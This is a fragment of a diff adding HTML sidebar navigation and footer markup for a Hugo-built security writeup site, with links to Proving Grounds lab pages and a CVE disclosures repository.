+            <li class="" data-nav-id="/writeup/proving-grounds/access/index.html"><a class="padding" href="/writeup/proving-grounds/access/index.html">Access</a></li>
+            <li class="" data-nav-id="/writeup/proving-grounds/nickel/index.html"><a class="padding" href="/writeup/proving-grounds/nickel/index.html">Nickel</a></li></ul></li></ul></li>
+          </ul>
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-shortcuts default-animation">
+          <div class="nav-title padding">More</div>
+          <ul class="space collapsible-menu">
+            <li class="" data-nav-id="https://github.com/eoniboogie/CVE_Disclosures"><a class="padding" href="https://github.com/eoniboogie/CVE_Disclosures" rel="external"><i class="fab fa-github"></i> CVE Disclosures</a></li>
+          </ul>
+        </div>
+        <div id="R-footer-margin" class="default-animation"></div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-footercontrols default-animation">
+          <ul class="">
+          </ul>
+        </div>
+<div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
+      </div>
+    </aside>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1772243226" defer></script>
+    <script src="/js/theme.js?1772243226" defer></script>
+    <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
+  </body>
+</html>
